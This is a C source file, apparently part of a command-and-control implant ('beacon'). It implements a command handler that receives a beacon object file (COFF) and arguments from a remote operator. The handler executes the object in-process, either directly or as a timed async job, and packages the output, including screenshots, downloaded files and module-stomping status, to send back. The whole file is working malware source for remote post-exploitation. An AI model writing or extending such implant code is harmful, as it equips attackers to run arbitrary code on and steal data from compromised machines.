/* beacon/src/Commands/Bof.c
 * CMD_BOF (0x20) - receive COFF object file + packed args, execute in-process.
 *
 * Task args wire format (v2 - async support):
 *   async_flag(1) | timeout_secs(4LE) | bof_size(4LE) | bof_bytes | user_args_size(4LE) | user_args
 *
 * Result format (compound - supports text + multiple media per BOF):
 *   [media_entry]...[0x00][text_len(4LE)][text]
 *
 * Each media entry is type-tagged:
 *   0x81: [0x81][note_len(4)][note][img_len(4)][img]   (screenshot)
 *   0x82: [0x82][name_len(4)][name][data_len(4)][data]  (download)
 *
 * If the BOF produced only text (no media), the result is raw text bytes
 * with no prefix tag - backwards compatible with the old format. */

#include "Nax.h"
#include "Common.h"
#include "Bof.h"

static VOID BofW32( PBYTE p, UINT32 v ) {
    p[0] = (BYTE)v; p[1] = (BYTE)( v >> 8 ); p[2] = (BYTE)( v >> 16 ); p[3] = (BYTE)( v >> 24 );
}

/* Reverse a singly-linked list (media entries are prepended; reverse for FIFO order). */
static NAX_BOF_MEDIA* BofReverseMedia( NAX_BOF_MEDIA* head ) {
    NAX_BOF_MEDIA* prev = NULL;
    while ( head ) {
        NAX_BOF_MEDIA* next = head->Next;
        head->Next = prev;
        prev = head;
        head = next;
    }
    return prev;
}

FUNC INT NaxCmdBof( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 args_len,
                    PBYTE out, UINT32* out_len ) {
    if ( args_len < 13 || args == NULL ) return NAX_ERR_INVAL;

    /* ---- parse v2 prefix ---- */
    BYTE   asyncFlag   = args[0];
    UINT32 timeoutSecs = NaxR32( args + 1 );
    PBYTE  bofArgs     = args + 5;
    UINT32 bofArgsLen  = args_len - 5;

    /* ---- parse COFF + user args ---- */
    if ( bofArgsLen < 8 ) return NAX_ERR_INVAL;
    UINT32 bof_size       = NaxR32( bofArgs );
    if ( 4u + bof_size + 4u > bofArgsLen ) return NAX_ERR_WIRE;

    PBYTE  bof_data       = bofArgs + 4;
    UINT32 user_args_size = NaxR32( bofArgs + 4 + bof_size );
    PBYTE  user_args      = bofArgs + 4 + bof_size + 4;

    if ( 4u + bof_size + 4u + user_args_size > bofArgsLen ) return NAX_ERR_WIRE;

    /* ---- async path ---- */
    if ( asyncFlag ) {
        DWORD timeoutMs = timeoutSecs ? timeoutSecs * 1000u : 0;
        NAX_JOB* job = NaxJobCreate( Nax, taskId, bof_data, bof_size, user_args, user_args_size, timeoutMs );
        if ( !job ) return NAX_ERR_NOMEM;

        INT rc = NaxJobStart( Nax, job );
        if ( rc != NAX_OK ) {
            *out_len = 0;
            return rc;
        }

        *out_len = 0;
        return NAX_STATUS_ASYNC;
    }

    /* ---- sync path (existing logic) ---- */
    PBYTE out_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, BOF_OUTPUT_CAP );
    if ( !out_buf ) return NAX_ERR_NOMEM;

    Nax->BofCtx.Buf       = out_buf;
    Nax->BofCtx.Len       = 0;
    Nax->BofCtx.Cap       = BOF_OUTPUT_CAP;
    Nax->BofCtx.MediaHead = NULL;

    INT ret = NaxBofExecute( Nax, bof_data, bof_size, user_args, user_args_size );

    BOOL has_text  = ( Nax->BofCtx.Len > 0 );
    BOOL has_media = ( Nax->BofCtx.MediaHead != NULL );

    /* Prepend 2-byte stomp metadata: [status][slot_idx] */
    UINT32 off = 0;
    if ( off + 2 <= *out_len ) {
        out[ off++ ] = Nax->BofCtx.Stomped;
        out[ off++ ] = Nax->BofCtx.StompSlot;
    }

    if ( has_media ) {
        Nax->BofCtx.MediaHead = BofReverseMedia( Nax->BofCtx.MediaHead );

        for ( NAX_BOF_MEDIA* m = Nax->BofCtx.MediaHead; m; m = m->Next ) {
            if ( off + m->Len <= *out_len ) {
                MmCopy( out + off, m->Data, m->Len );
                off += m->Len;
            }
        }

        if ( has_text && off + 5u + Nax->BofCtx.Len <= *out_len ) {
            out[ off ] = 0x00;
            BofW32( out + off + 1, Nax->BofCtx.Len );
            MmCopy( out + off + 5, out_buf, Nax->BofCtx.Len );
            off += 5u + Nax->BofCtx.Len;
        }
        *out_len = off;
    } else if ( has_text ) {
        UINT32 copy = ( Nax->BofCtx.Len < *out_len - off ) ? Nax->BofCtx.Len : *out_len - off;
        MmCopy( out + off, out_buf, copy );
        *out_len = off + copy;
    } else {
        *out_len = off;
    }

    NAX_BOF_MEDIA* m = Nax->BofCtx.MediaHead;
    while ( m ) {
        NAX_BOF_MEDIA* next = m->Next;
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, m->Data );
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, m );
        m = next;
    }
    Nax->BofCtx.MediaHead = NULL;

    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, out_buf );
    Nax->BofCtx.Buf = NULL;
    Nax->BofCtx.Len = 0;
    Nax->BofCtx.Cap = 0;

    return ret;
}
